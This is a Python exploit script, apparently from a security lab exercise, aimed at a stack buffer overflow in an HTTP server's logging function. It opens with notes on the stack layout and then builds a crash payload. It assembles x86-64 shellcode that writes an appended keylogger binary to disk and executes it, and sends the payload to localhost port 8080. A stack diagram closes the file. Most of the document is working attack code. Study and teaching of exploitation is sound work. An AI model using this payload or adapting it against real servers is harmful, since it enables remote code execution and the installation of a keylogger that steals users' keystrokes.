'''
[FINDINGS]
General flow:
1) Sent request
2) handle_client: Receives the whole request and sends the response back to the client using its file descriptor after rest of processing
3) parse_request: Parses the request in arg:request_buf, logs only (!!) the request header, receives any remaining body data, 
                  executes the request, and builds a response in arg:response_buf
4) log_message: Logs arg:message to stdout and to a file

In the handle_client function a space of 0x500018 is allocated on the stack in comparison to 0x518 in scenario 1.
So we have space for approx 5114 KB instead of the previous 1 KB which offers us enough space to also store the keylogger.
This space is mostly used for the request_buffer of parse_request which is 0x4fffff big.

Next the goal is the same as in scenario 1, crash the server so N = 1 again and next sent the payload to run the keylogger,
but now we also need to sent the keylogger first and execute this keylogger which is now located on the stack in the space
from previous alinea.

To do this we don't put the keylogger inside the stack frame of log_message but just append it to the payload
after the spot to place the return address to the shellcode and reference the start of the keylogger
in that shell code. Now we just execute this binary which is now located on the stack.
'''

from keystone import *
from pwn import *

### CONFIGS ###
port = 8080
             
original_rbp = 0x7ffff75d1e20 # the rbp value before the 'ret' instruction executed 
log_buffer_rbp_offset = 0x450 # the log buffer starts at $original_rbp-0x450
log_buffer_prefix = 49 # the server already adds 49 bytes at start of the log buffer

### PAYLOAD ###
message_prefix = b"GET /data.txt HTTP/1.1\r\n"
message_prefix_len = len(message_prefix)

### CREATE THE CRASH PAYLOAD ###
crash = message_prefix
padding_size = log_buffer_rbp_offset + 8 - log_buffer_prefix - len(crash) # extra 8 bytes to account for the caller's rbp
crash += b"q" * padding_size # add padding
crash += 0xffffffffffffffff.to_bytes(8, "little") # add new little endian return address
crash += b"\r\n\r\n"


### CREATE THE ATTACK PAYLOAD ###
# Load the keylogger binary file keylogger.exe
with open("./scenario_3/keylogger_small", "rb") as file:
  keylogger = file.read()
  
# Get the keylogger
keylogger = bytes(keylogger)

# Get keylogger length
keylogger_len = len(keylogger)

added_keylogger_len_bits = 32 - keylogger_len.bit_length()
added_keylogger_len_bits = added_keylogger_len_bits - (added_keylogger_len_bits % 4)

keylogger_len = '{:b}'.format(keylogger_len)
keylogger_len_32bit = keylogger_len + '1' * added_keylogger_len_bits
keylogger_len_32bit = hex(int(keylogger_len_32bit, 2))

# Start address of the keylogger
keylogger_start_address = 0x7ffff75d22d1

added_keylogger_start_bits = 64 - keylogger_start_address.bit_length()
added_keylogger_start_bits = added_keylogger_start_bits - (added_keylogger_start_bits % 4)

keylogger_start_address = '{:b}'.format(keylogger_start_address)
keylogger_start_address_64bit = keylogger_start_address + '1' * added_keylogger_start_bits
keylogger_start_address_64bit = hex(int(keylogger_start_address_64bit, 2))

# File name
keylogger_name = b"./keylogger"
keylogger_name_len = len(keylogger_name)
placeholder = b"12345678"
placeholder_len = len(placeholder)

payload_rsp_offset = 0x10 + log_buffer_rbp_offset - log_buffer_prefix - message_prefix_len

# Shell code the runs the keylogger
shell_code = f"""
  # Create new file
  lea rdi, [rsp-{payload_rsp_offset}] # ptr to injected "./keylogger"
  lea rsi, [rsp-{payload_rsp_offset - keylogger_name_len}] # argv: ptr to placeholder (future NULL ptr)
  lea rdx, [rsp-{payload_rsp_offset - keylogger_name_len}] # envp (= argv)
  xor rdx, rdx                                # xor nullbytes with itself to make actual 0
  mov [rsi], rdx  
  xor rsi, rsi
  mov sil, 102                                # create file
  xor rdx, rdx
  mov dx, 0777                                # set mode
  mov al, 2 
  syscall
  
  # Write to the file
  mov rdi, rax                                # load file descriptor into rdi
  mov rsi, {keylogger_start_address_64bit}                   # address of data to write
  shr rsi, {added_keylogger_start_bits}                 # Shift it back to to original length
  mov edx, {keylogger_len_32bit}                      # length of data
  shr edx, {added_keylogger_len_bits}          # Shift it back to to original length
  mov al, 1                                   # system call number for write
  syscall
    
  # Close the file
  mov rdi, rax                                # load file pointer in rdi
  mov al, 3
  syscall

  # Execute the keylogger
  lea rdi, [rsp-{payload_rsp_offset}] # ptr to injected "./keylogger"
  lea rsi, [rsp-{payload_rsp_offset - keylogger_name_len}] # argv: ptr to placeholder (future NULL ptr)
  lea rdx, [rsp-{payload_rsp_offset - keylogger_name_len}] # envp (= argv)
  mov al, 59
  syscall
"""

print(shell_code)

ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, _ = ks.asm(shell_code)

# build the payload
sc3_exploit = message_prefix
sc3_exploit += keylogger_name + placeholder
sc3_exploit += bytes(encoding) # add assembled shell code
padding_size = log_buffer_rbp_offset + 8 - log_buffer_prefix - len(sc3_exploit) # len includes the 24 bytes
sc3_exploit += b"q" * padding_size # add padding
retaddr = original_rbp - log_buffer_rbp_offset + log_buffer_prefix + message_prefix_len + keylogger_name_len + placeholder_len # the new (absolute) return address points to the first byte of the shell code
sc3_exploit += retaddr.to_bytes((retaddr.bit_length() + 7) // 8, byteorder = "little") # add new little endian return address without trailing null bytes
sc3_exploit += b"\r\n\r\n"
sc3_exploit += keylogger

### PERFORM ATTACK ###q
#remote("localhost", port).send(crash) # send crash payload
# sleep(2) # let the server restart
# Perform Attack
remote("localhost", port).send(sc3_exploit) # send attack payload


# details for 'payload_rsp_offset':
#
# stack representation after return to the injected shell code:
#
#                            current_rsp <┐            ┌> original_rbp           ┌> start of vulnerable buffer
#                                         |            |                         |
#                                         ||<---0x10-->|<---------0x450--------->|
# stack: <high addresses> =|======<1>======|retaddr|<2>|===========<3>===========| <low addresses>  (stack grow direction -->)
#                          |               |           |<5>|=========<4>=========|
#                          └> current_rbp  |               |==<6>==|==<7>=|==<8>=|
#                                          |                       |<-24->|<-49->|
#                                          |<--payload_rsp_offset->|
#                                                                  └> start of injected payload
# Legend:
#   <1>: caller stack frame
#   <2>: spilled rbp of the caller
#   <3>: log_message stack frame
#   <4>: vulnerable buffer
#   <5>: other local variables   -> 5 VARS so 0x20 big
#   <6>: injected payload
#   <7>: "GET /data.txt HTTP/1.1\r\n"
#   <8>: "== Request from..."